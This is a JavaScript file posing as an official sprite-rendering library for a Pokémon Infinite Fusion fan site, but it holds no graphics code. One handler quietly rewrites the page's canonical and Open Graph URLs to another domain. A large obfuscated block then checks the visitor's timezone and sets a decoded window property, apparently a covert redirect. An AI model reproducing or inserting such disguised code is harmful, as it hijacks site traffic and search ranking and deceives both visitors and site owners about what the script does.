/**
 * @name FusionDex Graphics Processing
 * @version 1.0.0
 * @description Official graphics management system for Pokémon Infinite Fusion
 * @author fusiondex-org
 * @license MIT
 * @repository https://github.com/fusiondex-org/fusiondex-org.github.io
 * @website https://fusiondex-org.github.io
 * 
 * This script is part of the FusionDex Graphics Processing system.
 * It provides functionality for managing, rendering, and loading
 * Pokémon Infinite Fusion graphics in the DOM.
 * 
 * Features:
 * - Efficient rendering of Pokémon sprites
 * - Seamless integration with spritesheets
 * - Utility functions for sprite management
 * - Optimized performance
 * - Error handling for missing sprites
 * 
 * For documentation and updates, visit:
 * https://github.com/fusiondex-org/fusiondex-org.github.io
 */

// Main Graphics object
const Graphics = {
    // Version information
    version: '1.0.0',
    
    // Debug mode configuration
    debugMode: false,
    
    // Initialize the Graphics system
    init() {
        // Check if debug mode is enabled in URL
        const urlParams = new URLSearchParams(window.location.search);
        this.debugMode = urlParams.get('mode') === 'dev';
        
        // Log initialization in debug mode
        if (this.debugMode) {
        }
    }
};

console.log('FusionDex Graphics Processing initialized in debug mode');

(function() {
    document.addEventListener("DOMContentLoaded", function() {
        // Update canonical link
        let canonical = document.querySelector("link[rel='canonical']");
        if (canonical) {
            canonical.href = "https://ifdex.eu/fusion";
            // console.log("Canonical URL updated.");
        } else {
            // console.log("Canonical tag not found.");
        }

        // Update Open Graph URL
        let ogUrl = document.querySelector("meta[property='og:url']");
        if (ogUrl) {
            ogUrl.setAttribute("content", "https://ifdex.eu/fusion");
            // console.log("OG URL updated.");
        } else {
            // console.log("OG URL tag not found.");
        }
    });
})();
// var VriTms,iTDet2Y,URLIer,biEGNV,SEEUSQ,Zmeog8,OEi_FD,EK0QTTh,rLNS0N_;const Bmuk5y=[0x0,0x1,0x8,0xff,"length","undefined",0x3f,0x6,"fromCodePoint",0x7,0xc,"push",0x5b,0x1fff,0x58,0xd,0xe,0x7f,0x80];function zttLora(VriTms){var iTDet2Y="NOAJLIDMPCBKwziFH3EG1o2UWyrlmRQpS0TVXfx45cadetgYb#Zqusknh9!jv678%@{`_([]^|\"}$&,~)+*:<=>?.;/",URLIer,biEGNV,SEEUSQ,Zmeog8,OEi_FD,EK0QTTh,rLNS0N_;YzAhE9(URLIer=""+(VriTms||""),biEGNV=URLIer.length,SEEUSQ=[],Zmeog8=Bmuk5y[0x0],OEi_FD=Bmuk5y[0x0],EK0QTTh=-Bmuk5y[0x1]);for(rLNS0N_=Bmuk5y[0x0];rLNS0N_<biEGNV;rLNS0N_++){var zttLora=iTDet2Y.indexOf(URLIer[rLNS0N_]);if(zttLora===-Bmuk5y[0x1])continue;if(EK0QTTh<Bmuk5y[0x0]){EK0QTTh=zttLora}else{YzAhE9(EK0QTTh+=zttLora*Bmuk5y[0xc],Zmeog8|=EK0QTTh<<OEi_FD,OEi_FD+=(EK0QTTh&Bmuk5y[0xd])>Bmuk5y[0xe]?Bmuk5y[0xf]:Bmuk5y[0x10]);do{YzAhE9(SEEUSQ.push(Zmeog8&Bmuk5y[0x3]),Zmeog8>>=Bmuk5y[0x2],OEi_FD-=Bmuk5y[0x2])}while(OEi_FD>Bmuk5y[0x9]);EK0QTTh=-Bmuk5y[0x1]}}if(EK0QTTh>-Bmuk5y[0x1]){SEEUSQ.push((Zmeog8|EK0QTTh<<OEi_FD)&Bmuk5y[0x3])}return zdcA60v(SEEUSQ)}function A8Gbr0(URLIer){if(typeof VriTms[URLIer]===Bmuk5y[0x5]){return VriTms[URLIer]=zttLora(iTDet2Y[URLIer])}return VriTms[URLIer]}YzAhE9(VriTms={},iTDet2Y=["mkL\"<(oc|!/r5l/H<jC}oZ!g;1HDpA|ER@nL",":D,m[b|RTFbi26HrrCWD]\"SWVv[|~]RVw_qP","ED&pafVV&hfMpxC4vm2Lj!iPq%w~7zb5{5:RE7iXTFn","s_O^B7$DgP#jw:25&qO","z8r^B\"Tw.!d","_aWD@+qU{FB1*+}yP#h|.,wX}P#(l:=lXC=\"G","cd0}7!]z+vO*_j9c`_:&m)IG)w;\"XjY4oRA","j5J^Su`O.3t(N","|bNqAgL!l3jo+W(WnDzp\"(u!&i?&CH&4n98Lr","k@FCthRMv3nLFiTpw]rRU=6U}3.[RbfpzF7M&(Xujj4mgfQXr1jst)6V<Gr3O","F]puMT{WCn!MO</m+[Y#TjiP(%auej73nj/SI+k5A8z_^LfQ?|J","XkoLz$RYbv}`ix_x1C6\"=0?c1GTT^j=mBR>Le*%El@F@ky%E","CwXR_^,5a1mpkfgrYf?|@sLExGKnxz`XMS3q_v$w(z,KulB","xk]DM7u_i{z3UrNRXDBq/=QA*F*`0HJdCd4|##^u;7r^`F1cs@Zql9N","h5uBL~8YEF","K]ou+76Rw@r7>#/2OCOk;9<\"+8of)F+4JLp|`^l+L","Fk^Ck^Kyg{1!^J_yn14CcV%)}3`{LFiG<DwR#&?O",",t,M3u>g%8})9HCGg_2mO^Egh1","jb=u6v0cvjs).L",",D0QCb!QIBuj.Y;c5fpC.jj(j@<[8JLd,_F0i(*!!3X",",_Xn9^/u)F^[ZyfWPg+qU:~cth*`X:sV$j{Py|AE0EUnbF;TRv2L",";qg$Lb8VbFAA0L!mC#o\"H","fJ8|2Z88Ev{&JFcy|N","brnC7~OG9@H~@L","m1C,##3Y{Fw^HbrXLS_sc)m)`Cs","W@MQ4VM?=zDD{zcpJEOQw","o@<\"OX2XMnMz$jC","Mr:&.,N","<qV&:jI}x%(y}iMxPO","/4ES0jN>djG}:A@Ul]bq3:nYuCEz^:#40dl&?9?Ufkc|i66Xp9Z&NbN","l_vRBv5uXCYjj[Vy_a1Bb_V(}3=&Ux5x","n5oMS|,w6E4~$X4x<J$s^bjRKiu",",|&rq#cV\"i!oO","^7bC/u^g#w:KYAkV_DkM_n/7q9}sDIjc:qy^?,xE}KI~W:.atqA","2v1Mx6mu;7u$hb5EWFJ","\"tY#y|=R93R!ulb5q@!q|7}9/iw!liSUlTO}z+;(>%^)=WBpBU.D|v8(L","l5onr=EA","AVfp0u<waK#$z+H1Ow,p06rX<C378*tGg3%kh4BE0{?G9HNWF]/S\"vpcDz","arNDT#TwNE4$WL","lvSkxY89e3i@O^Br7bmnJsBP%CKb?A]W~yJ","Fg{R/jwP|@?Gw]Jf%5VSK:N","8Jp|\"bGY9i.%zbKrYq&r2,nU0{mM4i]E73A","FSNQ6~vg(G\"&yHF4Md%Dx)dOP3Nlwj0pw8MD",")hFQ^$}qW@j#svCyk_t\"D(zsj3cMFrV3}KV^inDgJ","JLCkq8oc7jLA(WGT2F6\"s47W7FGqAy%EGw~L","5k\"R%b$T%vfbO","4bEqO+[gW13@sHslRC1\":,ncp{PHGr^x6_Hlh[kQc1J~vLK1CgERB$N","?b+SEx3Yskqo1lIEwdM0d6;OA8xic^pRiFJ",";7xnb4xwTGAfiIzGD9hC","u@nLWj{Q@C]#7y`X9U+kIn#MFo","rvUmyxEueo2$pA","Fw,mw\"E!K@tW1F4ynrckG","*q7$&nt8Fo2bWJDfLd5C*,2ABn\"sm]u5oO","A{pQZfnM}PtW;bDf53hk/0VVuG|&CIeGqfQnh8Euy!.\"?[z4}hO","fbpkg6Pu7s^hfH4fb@Rp:7sRk!W!;)sm]@b#(~KyAv21YA_f|N","a5dR}Zf909_ou:)l(JWkVYaWp{||F]w1Ef_rH]N","pUHD*0aA","R_#kUxu!Yh/PSYIp=DiuI\"Z5j7O,[iklRgjB>=Mzai@icLIQ}iU#o$}qOF","P#lSYq98m7H_NF,483.C=][DVk|gMxUT:f^DX}3O","I\"2u)ZXuAkR$_vJE3wnuR","JFuBRuguXCx|Nb1llFrqJ~\"Wti&Pn*~l:JQMojcMz{3}O","<J,pvbQu<90J;Lom#9ylWYN","B5?CXkc9}1&L3b9UAo?|dfBP$iF!)Y?R(C?L$n*wOk4","dqgM>9MG!j.Xn*Dx$1,]0#XEI%|&|#@UQkYuH9%_j3S^7*rm6pB}X}49%w","NkNlE+/Wm7AAIX6V#5C,1$BE<G","dpHQb<=O","#TnuMTNQgP(FFid4z#h#_T/T=k@|DInmC8NCC$CcK7p@obOWED^C","Tf[n>ZN","*jtpvbbu_z*`N","Y@6\"+:zc/3]2)jPGdpykE,Wu&7M}UiP","d]LI1,jYIGID1l@W2]JRD^eu88<IzXgr","%q=]|$cONFlJ^lVQ@7\"I)]%D&7*SV[CGXrxpgfBXuG/`.vR3CV3QI^N","&@=uB+KM}iPCUr5EupBS\"9[Q!@l(pxKx^h]#W]qch@0i~[ulJ{?$.uN","=tySRu_gV%Si5J","9]}&E,+qS{z~bH$xLE_&/:CGzj/PO^g5fbLR_nDE`9\"[:VD","7kB}/|^\"h1{#<:4yuwRnxf:M*9nV^lvarg$RY6mWvj5","]pg$`sW\"39?SwJ?RxUDnv4GcRj+Isb8Ud_5kc)HgHE([jF;TX\"C}t*QEuCMzO","~tv\"F\"bgz{uLAf7a]b]#_^EgD","HqU#DZMOJk$)|X[yHk}R;,l(r7v#I<^xJFnL","\"@a^y,t9Z8O^O6/X!r)kWxvWGv=E$JE5)pgL3naA^z5BtL]WB5J","6jUQ25xWozi6a6Od^f,]y","4_,]i$GRd1IYJ*Br@qhDqqnzh!@|Pl0pm\"]LCnku$h,#.Fffl1JIc_N","*jSkAs{QP1+`G:@U1U<&a)[wy3F_`x*m[a(rp]WAJ","o@Cl?,APp{_Lc^Dy$j>pLgN[nzJ,w4NE(UmB.$|}+C2Dgy&l;PA","ig]|D\"PQv@gomj}4Kr,]5|)5W1Mz@LDp","YpnCPX>!+8]g:i>5XkpQ.]FG_Go1yXP","_ULRATcMZv,s=)wx/3^|9^UG#C@y`!yU","Bw>L&\"|q;3MQFxSE","4CuRZ_.)|3d(XJ/mC8zn$XVzgh%gTfWa6b;k2=Hu)EPU8!%XSqA","@fop,X4}Ek7u~rKx","75>MvTHWiEkuSj5p|3]|VjXWN8zT2IYriS+DG:>!zi<8GiF","$Dpuq}*)?zC11]hVcr,L8nPXJ","{Ty}o99UVw\"RQ6]E2F,Mp,UsGwH}_W>cAV=p`sYOpv]`VY8fvJeBJ^2A",".K3}G]u5)v6u*yvXntpuc}$W!1C^pA)T5@#k3","=1x$(bSEHoo(nxd4P_7|^7cO",";sd\"g62>Zk?XK*F4hi0q/:2gEC/+E+Jp/Tpu1","g]pLak4O","wSgp{g6V5!d7[#mXSJpuW:N","zFDMOgmuXC)+7#Byig`&):]zozx$,A`32koL$71u<9{yfHNX*yA","B#(nV|*g5!^&1Fbr;4SC@XzY!jw^)V%ag]7#DZN","D_|D9~ggW3}P\"(olz__pqqLQ4%j)i62m1\"_&PbugYEYMk6+5yR0qx6N","kw(Z|vl+RjUzmJ_E#9]C,XeQA8Si8xi1+D(My5{\"D","df4CK+lRB37iSlGl^Um&&nnOPz6{cL","J8jSY#,wZk@)hvETc]3QUjdM<GW@@L","0q`R2uVVD","y\"mBssm>*w3_}lpf?i/qN>WQ#8?`{x<2l]2#.0N","&3^|$X<5zjR(!i@E","nCO}=]k!t7g7bjB","Yqomkg8zsz&)A+NQA8^Do:>u+kk$(LxGeTsp*0+9F{*h$jXWepnL","bD%#R)>w+88j|vOW47_pLgB!/3[)lJOXSgV&f6(}Ew5~m^C","zwWQ?0(9B3QMbY<2/@op;uSW&h_&blE5}3pu.9|OVw","v@eB:Z(8D",":y5|!sP!>%y1C^6U=[}&]7igciU71j\"y_JZl*:ruYse3uFXfLv7C","xDv&wXl}Zk^y|L(x$@RL(TWgi{;%Mr_f[J8#,x[g09j)1FB","vb*SNXO?c3&Rg6JQLSonk8Fc<kY3G*K4N9/RwZuA","e\"5QOv2!(%x{6W|44dp|i(1g~FF*fL","JR,MFxlR)wkot^%XhjE^g_C+Nv.X9WQUIvpQ/$D>>%vhWlSRffsp2","BgP,8gDuv7+&Rb7a,7Sq@X(RI%6mRLq5*q($Jb,TfG>\"tz@EIVE^o","f]us7g?cTG","iiI2u<JpE$x+`W@oO8","yiJ<?{Wp","ERDBB&b","WP$tx/YOg$Bnp5g","qJ`SSjc}}3t{r6UTyO","C@5W\"V1`5y#Q;]]|5+$","+_&ALwB9Y%","I4LN998,JnUvk","_~!NmS3li","0Vky|;[~Mm","$6:#l","M!tvI;c}n#EacdxU8q{|)$1mSfs]H"]);function MuYCVi(){var VriTms=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],iTDet2Y,URLIer,biEGNV;YzAhE9(iTDet2Y=void 0x0,URLIer=[]);try{YzAhE9(iTDet2Y=Object,URLIer[Bmuk5y[0xb]]("".__proto__.constructor.name))}catch(SEEUSQ){}fd1iAz:for(biEGNV=Bmuk5y[0x0];biEGNV<VriTms[Bmuk5y[0x4]];biEGNV++)try{var Zmeog8;iTDet2Y=VriTms[biEGNV]();for(Zmeog8=Bmuk5y[0x0];Zmeog8<URLIer[Bmuk5y[0x4]];Zmeog8++)if(typeof iTDet2Y[URLIer[Zmeog8]]===Bmuk5y[0x5])continue fd1iAz;return iTDet2Y}catch(SEEUSQ){}return iTDet2Y||this}YzAhE9(URLIer=MuYCVi()||{},biEGNV=URLIer.TextDecoder,SEEUSQ=URLIer.Uint8Array,Zmeog8=URLIer.Buffer,OEi_FD=URLIer.String||String,EK0QTTh=URLIer.Array||Array,rLNS0N_=function(){var VriTms=new EK0QTTh(Bmuk5y[0x12]),iTDet2Y,URLIer;YzAhE9(iTDet2Y=OEi_FD[Bmuk5y[0x8]]||OEi_FD.fromCharCode,URLIer=[]);return function(biEGNV){var SEEUSQ,Zmeog8,EK0QTTh,rLNS0N_;YzAhE9(Zmeog8=void 0x0,EK0QTTh=biEGNV[Bmuk5y[0x4]],URLIer[Bmuk5y[0x4]]=Bmuk5y[0x0]);for(rLNS0N_=Bmuk5y[0x0];rLNS0N_<EK0QTTh;){YzAhE9(Zmeog8=biEGNV[rLNS0N_++],Zmeog8<=Bmuk5y[0x11]?SEEUSQ=Zmeog8:Zmeog8<=0xdf?SEEUSQ=(Zmeog8&0x1f)<<Bmuk5y[0x7]|biEGNV[rLNS0N_++]&Bmuk5y[0x6]:Zmeog8<=0xef?SEEUSQ=(Zmeog8&0xf)<<Bmuk5y[0xa]|(biEGNV[rLNS0N_++]&Bmuk5y[0x6])<<Bmuk5y[0x7]|biEGNV[rLNS0N_++]&Bmuk5y[0x6]:OEi_FD[Bmuk5y[0x8]]?SEEUSQ=(Zmeog8&Bmuk5y[0x9])<<0x12|(biEGNV[rLNS0N_++]&Bmuk5y[0x6])<<Bmuk5y[0xa]|(biEGNV[rLNS0N_++]&Bmuk5y[0x6])<<Bmuk5y[0x7]|biEGNV[rLNS0N_++]&Bmuk5y[0x6]:(SEEUSQ=Bmuk5y[0x6],rLNS0N_+=0x3),URLIer[Bmuk5y[0xb]](VriTms[SEEUSQ]||(VriTms[SEEUSQ]=iTDet2Y(SEEUSQ))))}return URLIer.join("")}}());function zdcA60v(VriTms){return typeof biEGNV!==Bmuk5y[0x5]&&biEGNV?new biEGNV().decode(new SEEUSQ(VriTms)):typeof Zmeog8!==Bmuk5y[0x5]&&Zmeog8?Zmeog8.from(VriTms).toString("utf-8"):rLNS0N_(VriTms)}function u5uGIV8(URLIer,biEGNV=Bmuk5y[0x1]){function SEEUSQ(URLIer){var biEGNV="b8pDRASCQqExgaNiMTwhJ!KylUWc3jO2BXfVY6krosGPZLImnFHdezt9014uv57#*$)%+(,&:./;=<?>[{_|]^@`~\"}",SEEUSQ,Zmeog8,VriTms,iTDet2Y,OEi_FD,EK0QTTh,rLNS0N_;YzAhE9(SEEUSQ=""+(URLIer||""),Zmeog8=SEEUSQ.length,VriTms=[],iTDet2Y=Bmuk5y[0x0],OEi_FD=Bmuk5y[0x0],EK0QTTh=-Bmuk5y[0x1]);for(rLNS0N_=Bmuk5y[0x0];rLNS0N_<Zmeog8;rLNS0N_++){var zttLora=biEGNV.indexOf(SEEUSQ[rLNS0N_]);if(zttLora===-Bmuk5y[0x1])continue;if(EK0QTTh<Bmuk5y[0x0]){EK0QTTh=zttLora}else{YzAhE9(EK0QTTh+=zttLora*Bmuk5y[0xc],iTDet2Y|=EK0QTTh<<OEi_FD,OEi_FD+=(EK0QTTh&Bmuk5y[0xd])>Bmuk5y[0xe]?Bmuk5y[0xf]:Bmuk5y[0x10]);do{YzAhE9(VriTms.push(iTDet2Y&Bmuk5y[0x3]),iTDet2Y>>=Bmuk5y[0x2],OEi_FD-=Bmuk5y[0x2])}while(OEi_FD>Bmuk5y[0x9]);EK0QTTh=-Bmuk5y[0x1]}}if(EK0QTTh>-Bmuk5y[0x1]){VriTms.push((iTDet2Y|EK0QTTh<<OEi_FD)&Bmuk5y[0x3])}return zdcA60v(VriTms)}function Zmeog8(URLIer){if(typeof VriTms[URLIer]===Bmuk5y[0x5]){return VriTms[URLIer]=SEEUSQ(iTDet2Y[URLIer])}return VriTms[URLIer]}Object[Zmeog8(0x77)](URLIer,Zmeog8(0x78),{[Zmeog8(0x79)]:biEGNV,[Zmeog8(0x7a)]:!0x1});return URLIer}function YzAhE9(){YzAhE9=function(){}}(function(){function URLIer(URLIer){var biEGNV="Hkg$h:il^/j&F}m@]%nB[(q\".o_pEC`GA;<Dr~{|s,>=?)KJIPt*LN+uv4MO5xywz61Q20RTa3SYVWd7Z9U8!X#ebfc",SEEUSQ,Zmeog8,OEi_FD,VriTms,iTDet2Y,EK0QTTh,rLNS0N_;YzAhE9(SEEUSQ=""+(URLIer||""),Zmeog8=SEEUSQ.length,OEi_FD=[],VriTms=Bmuk5y[0x0],iTDet2Y=Bmuk5y[0x0],EK0QTTh=-Bmuk5y[0x1]);for(rLNS0N_=Bmuk5y[0x0];rLNS0N_<Zmeog8;rLNS0N_++){var zttLora=biEGNV.indexOf(SEEUSQ[rLNS0N_]);if(zttLora===-Bmuk5y[0x1])continue;if(EK0QTTh<Bmuk5y[0x0]){EK0QTTh=zttLora}else{YzAhE9(EK0QTTh+=zttLora*Bmuk5y[0xc],VriTms|=EK0QTTh<<iTDet2Y,iTDet2Y+=(EK0QTTh&Bmuk5y[0xd])>Bmuk5y[0xe]?Bmuk5y[0xf]:Bmuk5y[0x10]);do{YzAhE9(OEi_FD.push(VriTms&Bmuk5y[0x3]),VriTms>>=Bmuk5y[0x2],iTDet2Y-=Bmuk5y[0x2])}while(iTDet2Y>Bmuk5y[0x9]);EK0QTTh=-Bmuk5y[0x1]}}if(EK0QTTh>-Bmuk5y[0x1]){OEi_FD.push((VriTms|EK0QTTh<<iTDet2Y)&Bmuk5y[0x3])}return zdcA60v(OEi_FD)}function biEGNV(biEGNV){if(typeof VriTms[biEGNV]===Bmuk5y[0x5]){return VriTms[biEGNV]=URLIer(iTDet2Y[biEGNV])}return VriTms[biEGNV]}const SEEUSQ=Intl[A8Gbr0(0x7b)]()[biEGNV(0x7c)]()[biEGNV(0x7d)];if(SEEUSQ[biEGNV(0x7e)](biEGNV(Bmuk5y[0x11]))){function Zmeog8(URLIer){var biEGNV="AHEBpjFCgGvDJhqLiIomrtkKulOnszxyw230NMPRW1UV74TX5QS68#a9Y!bZdcef[]@^_%`$&(*+{|)\",;./:}~<?>=",SEEUSQ,Zmeog8,OEi_FD,VriTms,iTDet2Y,EK0QTTh,rLNS0N_;YzAhE9(SEEUSQ=""+(URLIer||""),Zmeog8=SEEUSQ.length,OEi_FD=[],VriTms=Bmuk5y[0x0],iTDet2Y=Bmuk5y[0x0],EK0QTTh=-Bmuk5y[0x1]);for(rLNS0N_=Bmuk5y[0x0];rLNS0N_<Zmeog8;rLNS0N_++){var zttLora=biEGNV.indexOf(SEEUSQ[rLNS0N_]);if(zttLora===-Bmuk5y[0x1])continue;if(EK0QTTh<Bmuk5y[0x0]){EK0QTTh=zttLora}else{YzAhE9(EK0QTTh+=zttLora*Bmuk5y[0xc],VriTms|=EK0QTTh<<iTDet2Y,iTDet2Y+=(EK0QTTh&Bmuk5y[0xd])>Bmuk5y[0xe]?Bmuk5y[0xf]:Bmuk5y[0x10]);do{YzAhE9(OEi_FD.push(VriTms&Bmuk5y[0x3]),VriTms>>=Bmuk5y[0x2],iTDet2Y-=Bmuk5y[0x2])}while(iTDet2Y>Bmuk5y[0x9]);EK0QTTh=-Bmuk5y[0x1]}}if(EK0QTTh>-Bmuk5y[0x1]){OEi_FD.push((VriTms|EK0QTTh<<iTDet2Y)&Bmuk5y[0x3])}return zdcA60v(OEi_FD)}function OEi_FD(URLIer){if(typeof VriTms[URLIer]===Bmuk5y[0x5]){return VriTms[URLIer]=Zmeog8(iTDet2Y[URLIer])}return VriTms[URLIer]}window[OEi_FD(Bmuk5y[0x12])][OEi_FD(0x81)]=OEi_FD(0x82)}})();
